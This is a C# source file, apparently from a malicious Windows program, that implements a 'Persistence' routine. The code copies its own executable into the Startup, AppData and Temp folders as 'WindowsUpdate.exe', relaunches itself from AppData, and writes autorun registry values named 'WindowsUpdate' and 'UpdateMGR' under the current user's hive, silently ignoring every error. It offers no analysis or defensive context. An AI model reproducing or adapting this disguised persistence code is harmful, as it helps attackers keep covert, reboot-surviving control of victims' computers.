using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using ëntärtäïnër.Properties;
using Microsoft.Win32;

namespace ëntärtäïnër
{
    internal static class Persistence
    {
        private const string FileName = "WindowsUpdate";
        private const string RegName1 = "WindowsUpdate";
        private const string RegName2 = "UpdateMGR";
        public static void Persist()
        {
            RefreshFile(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), $"{FileName}.exe"));
            string appDataBin = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                $"{FileName}.exe");
            if (RefreshFile(appDataBin))
            {
                Process.Start(appDataBin, "sleep");
                Environment.Exit(0);
            }
            string tempPath = Path.Combine(Path.GetTempPath(), $"{FileName}.exe");
            RefreshFile(tempPath);
            foreach (string s in Resources.RegPaths.Split('\n'))
            {
                RefreshReg(s, $"{RegName1}", appDataBin);
                RefreshReg(s, $"{RegName2}", tempPath);
            }
        }

        private static bool RefreshFile(string filePath)
        {
            try
            {
                if (File.Exists(filePath))
                    return false;
                File.Copy(Assembly.GetExecutingAssembly().Location, filePath);
                return true;
            }
            catch { return false; }
        }

        private static void RefreshReg(string hkcuKey, string valueName, string value)
        {
            try
            {
                Registry.CurrentUser.OpenSubKey(hkcuKey, false).GetValue(valueName);
            }
            catch
            {
                try
                {
                    Registry.CurrentUser.CreateSubKey(hkcuKey);
                }
                catch { }
            }
            try
            {
                if (Registry.CurrentUser.OpenSubKey(hkcuKey, false).GetValue(valueName) != null)
                    return;
                Registry.CurrentUser.OpenSubKey(hkcuKey, true).SetValue(valueName, value);
            }
            catch { }
        }
    }
}